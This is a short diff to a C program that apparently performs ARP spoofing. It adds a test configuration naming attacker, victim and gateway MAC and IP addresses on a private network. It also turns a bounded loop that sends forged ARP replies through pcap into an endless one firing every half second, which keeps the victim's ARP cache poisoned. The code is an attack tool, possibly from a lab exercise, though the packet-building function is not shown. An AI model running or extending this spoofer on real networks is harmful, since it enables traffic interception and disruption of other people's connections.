@@ -93,6 +93,15 @@ int main(void)
 	_info.g_ip = "192.168.42.1";
 #endif
 
+#ifdef _TEST_CASE_4
+	_info.a_host = "a8:5e:45:55:1e:8a";
+	_info.a_ip = "192.168.42.2";
+	_info.v_host = "b0:6e:bf:c6:fa:45";
+	_info.v_ip = "192.168.42.4";
+	_info.g_host = "88:36:6c:7a:56:40";
+	_info.g_ip = "192.168.42.1";
+#endif
+
 	pcap_t* dev_handle = get_pcap_handle();
 	if (dev_handle == NULL)
 	{
@@ -104,10 +113,10 @@ int main(void)
 	int arp_packet_len = 0;
 	make_arp_reply(arp_packet, &arp_packet_len);
 
-	for (int i = 0; i < 100; i++)
+	while(true)
 	{
 		pcap_sendpacket(dev_handle, arp_packet, arp_packet_len);
-		Sleep(1000);
+		Sleep(500);
 	}
 	
 	return 0;
